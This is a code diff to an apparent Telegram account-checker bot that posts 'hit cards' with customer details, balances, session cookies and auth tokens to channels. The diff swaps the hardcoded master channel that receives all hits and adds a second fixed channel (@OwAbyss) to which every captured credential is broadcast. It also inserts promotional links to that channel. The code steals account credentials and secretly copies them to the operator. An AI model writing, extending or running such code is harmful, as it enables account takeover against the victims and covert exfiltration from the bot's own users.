@@ -504,10 +504,12 @@ def broadcast_hit_to_channels(hit_card: str, chat_id: int):
     log_ch = get_effective_log_channel(chat_id)
     if log_ch:
         channels.add(log_ch)
-    # Master Universal Channel unconditionally receives 100% of hits:
-    master_ch = MASTER_CHANNEL_ID or DEFAULT_LOG_CHANNEL or "-1003626087056"
+    # Master Gemini Channel (-1003907841421):
+    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003907841421"
     if master_ch:
         channels.add(master_ch)
+    # Official Updates Channel (@OwAbyss / -1003810383682):
+    channels.add("-1003810383682")
 
     for ch in channels:
         try:
@@ -1743,6 +1745,8 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"⚡ <b>BB AUTH JSON:</b>\n<pre><code class=\"language-json\">{esc(auth_json_disp)}</code></pre>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"📢 <b>Official Channel:</b> @OwAbyss\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"✅ <i>Saved to report & broadcast to channels!</i>"
                 )
                 safe_send(chat_id, hit_card)
@@ -2071,6 +2075,9 @@ def show_main_menu(chat_id: int, message_id: Optional[int] = None):
         types.InlineKeyboardButton("📱 Check Single Number", callback_data="menu_single"),
         types.InlineKeyboardButton("❓ Help & User Guide", callback_data="menu_help")
     )
+    markup.add(
+        types.InlineKeyboardButton("📢 Official Channel (@OwAbyss)", url="https://t.me/OwAbyss")
+    )
     if chat_id == SUPER_ADMIN_ID:
         markup.add(types.InlineKeyboardButton("👑 Super Admin Suite", callback_data="menu_admin"))
     elif chat_id in ADMIN_USER_IDS:
@@ -2245,6 +2252,7 @@ def show_channels_menu(chat_id: int, message_id: Optional[int] = None):
 
 • <b>Your Log Channel:</b> <code>{esc(log_ch)}</code>
 • <b>Your Storage Channel:</b> <code>{esc(storage_ch)}</code>
+• <b>Official Updates Channel:</b> @OwAbyss (<code>-1003810383682</code>)
 
 <b>Channel Functionality:</b>
 • <b>Log Channel:</b> Instant Hit cards with customer details, balance & tokens are posted live.
@@ -3138,6 +3146,8 @@ def handle_incoming_text(message):
                 f"🍪 <b>1-Click Cookie:</b>\n<code>{esc(cookie_disp)}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"⚡ <b>BB AUTH JSON:</b>\n<pre><code class=\"language-json\">{esc(auth_json_disp)}</code></pre>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📢 <b>Official Channel:</b> @OwAbyss\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ Checked at: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
             )
